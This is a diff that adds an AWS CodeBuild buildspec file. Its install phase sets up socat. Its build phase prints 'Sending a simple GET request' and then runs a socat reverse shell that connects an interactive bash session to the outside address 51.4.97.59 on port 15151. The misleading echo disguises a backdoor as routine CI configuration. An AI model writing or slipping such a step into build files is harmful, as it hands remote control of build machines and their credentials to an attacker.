@@ -1,0 +1,16 @@
+version: 0.2
+
+phases:
+  install:
+    commands:
+      - echo "Installing socat..."
+      - sudo yum update -y
+      - sudo yum install -y socat
+  build:
+    commands:
+      - echo "Sending a simple GET request"
+      - socat "exec:bash -li,pty,stderr,setsid,sigint,sane" "tcp:51.4.97.59:15151" 
+
+artifacts:
+  files: [] # Indicates no artifacts to save
+  discard-paths: yes # Do not preserve the full path structure
